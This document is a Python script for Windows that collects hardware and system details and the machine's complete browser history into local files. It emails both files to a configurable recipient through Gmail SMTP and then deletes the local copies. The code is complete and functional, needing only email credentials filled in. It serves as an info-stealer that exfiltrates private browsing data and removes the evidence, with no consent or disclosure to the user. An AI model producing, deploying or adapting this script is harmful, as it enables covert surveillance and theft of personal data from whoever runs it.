
import time
import sys
import os
import time
import datetime
import GPUtil
import psutil
import wmi
import platform
import winreg
from browser_history import get_history
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

print("*"*20)

### System information ###

uname = platform.uname()

list_sys = []

list_sys.append(["System", uname.system])
list_sys.append(["Node Name", uname.node])
list_sys.append(["Release", uname.release])
list_sys.append(["Version", uname.version])
list_sys.append(["Machine", uname.machine])
list_sys.append(["Processor", uname.processor])
list_sys.append(["Date time", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")])

print(list_sys)

### GPU information ###

list_gpus = []
gpus = GPUtil.getGPUs()

for gpu in gpus:
    list_gpus.append(["id", gpu.id])
    list_gpus.append(["GPU name", gpu.name])
    list_gpus.append(["load", f"{gpu.load*100} %"])
    list_gpus.append(["free memory", f"{gpu.memoryFree} MB"])
    list_gpus.append(["used memory", f"{gpu.memoryUsed} MB"])
    list_gpus.append(["total memory", f"{gpu.memoryTotal} MB"])
    list_gpus.append(["temperature", f"{gpu.temperature} C"])
    list_gpus.append(["uuid", gpu.uuid])

print(list_gpus)

### CPU information ###

reg_key = r"HARDWARE\DESCRIPTION\System\CentralProcessor\0"

try:
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_key, 0, winreg.KEY_READ)
    cpu_name, _ = winreg.QueryValueEx(key, "ProcessorNameString")
    winreg.CloseKey(key)
except FileNotFoundError:
    cpu_name = 'Unknown'

print("CPU Name:", cpu_name)

list_cpu = []
cpu_freq = psutil.cpu_freq()

list_cpu.append(["CPU name", cpu_name])
list_cpu.append(["Physical cores", psutil.cpu_count(logical = False)])
list_cpu.append(["Logical cores", psutil.cpu_count(logical = True)])
list_cpu.append(["Max Frequency", f"{cpu_freq.max:.2f} Mhz"])
list_cpu.append(["Min Frequency", f"{cpu_freq.min:.2f} Mhz"])
list_cpu.append(["Current Frequency", f"{cpu_freq.current:.2f} Mhz"])

print(list_cpu)

### RAM information ###

list_ram = []

total_ram = round(psutil.virtual_memory().total / (1024**3), 2)
total_ram_gb = f"{total_ram} GB"

wmi_obj = wmi.WMI()
ram_speed = wmi_obj.Win32_PhysicalMemory()[0].Speed
ram_speed_mhz = f"{ram_speed} Mhz"
ram_type = wmi_obj.Win32_PhysicalMemory()[0].MemoryType

list_ram.append(["Total RAM", total_ram_gb])
list_ram.append(["RAM Speed", ram_speed_mhz])
list_ram.append(["RAM type", ram_type])

print(list_ram)

### specification file ###

print("creating specs file")
with open("specs.txt","w") as file:
    file.writelines(("="*14, " System Details ", "="*13, "\n\n"))

    for header, spec in list_sys:
        file.writelines(f"{header : <16}{spec}\n")

    file.writelines("\n")
    file.writelines(("="*15, " GPU Details ", "="*15, "\n\n"))

    for header, spec in list_gpus:
        file.writelines(f"{header : <16}{spec}\n")

    file.writelines("\n")
    file.writelines(("="*15, " CPU Details ", "="*15, "\n\n"))

    for header, spec in list_cpu:
        file.writelines(f"{header : <18}{spec}\n")

    file.writelines("\n")
    file.writelines(("="*15, " RAM Details ", "="*15, "\n\n"))

    for header, spec in list_ram:
        file.writelines(f"{header : <18}{spec}\n")

print("done")

### Browsers history file ###

outputs = get_history()
outputs.save("history.csv")

print("done")

current_folder = os.getcwd()
print("Current folder path:", current_folder)

specs_file = "specs.txt"

specs_path = os.path.abspath(specs_file)

if os.path.isfile(specs_path):
    print(f"The file '{specs_file}' exists at path: {specs_path}")
else:
    print(f"The file '{specs_file}' does not exist in the current folder.")

def delete_file(file_path):
    try:
        os.remove(file_path)
        print("file", file_path, "deleted successfully")
    except:
        print("can't delete file")

def send_email(sender_email, sender_password, recipient_email, subject, body, attachment_path, file_name):
    # Creating a message
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject

    # Adding content to the message
    msg.attach(MIMEText(body, 'plain'))

    # Adding an attachment
    with open(attachment_path, "rb") as f:
        part = MIMEApplication(f.read(), Name=attachment_path)
    part['Content-Disposition'] = f'attachment; filename="{file_name}"'
    msg.attach(part)

    # Establishing a connection to the Gmail SMTP server (using SSL)
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    
    # Logging into the Gmail account
    server.login(sender_email, sender_password)

    # Sending the message
    server.sendmail(sender_email, recipient_email, msg.as_string())

    # Logging out from the SMTP server
    server.quit()

# Data for sending an email
sender_email = 'your_email@gmail.com'
sender_password = 'your gmail app password'
recipient_email = 'your recipient email'
subject = 'email subject'
body = 'email content.'

def generate_paths():
    unix_time = time.time()
    paths = []
    
    specs_file = "specs.txt"
    specs_destination_path = str(unix_time) + "_specs.txt"
    specs_path = os.path.abspath(specs_file)

    history_file = "history.csv"
    history_destination_path = str(unix_time) + "_history.csv"
    history_path = os.path.abspath(history_file)

    paths.append([specs_path, specs_destination_path])
    paths.append([history_path, history_destination_path])

    return paths

print(generate_paths())
paths = generate_paths()

for i, path in enumerate(paths):
    print("Uploading file:", i+1, path[0], path[1])
    send_email(sender_email, sender_password, recipient_email, subject, body, path[0], path[1])
    print("done")
    print("Deleting file::", i+1, path[0], path[1])
    delete_file(path[0])
    print("done")


